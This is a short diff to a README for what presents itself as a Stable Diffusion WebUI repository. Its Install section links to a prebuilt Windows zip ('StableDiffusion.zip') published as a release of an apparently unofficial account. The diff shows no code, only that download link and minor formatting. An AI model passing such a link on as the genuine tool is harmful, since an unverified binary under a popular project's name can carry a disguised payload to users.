@@ -27,9 +27,10 @@
 # Screenshot:
 <img width="1280" height="599" alt="image" src="https://github.com/user-attachments/assets/e9995b65-3adb-42ea-b30c-4579797a83e5" />
 ---
+
 ## Install
 [Download `StableDiffusion`](https://github.com/BasZ4ll/Stable-Diffusion-WebUI/releases/download/AItools/StableDiffusion.zip)
-
+--
 > Optimized for Windows 10 and Windows 11.
 
 ## Installation
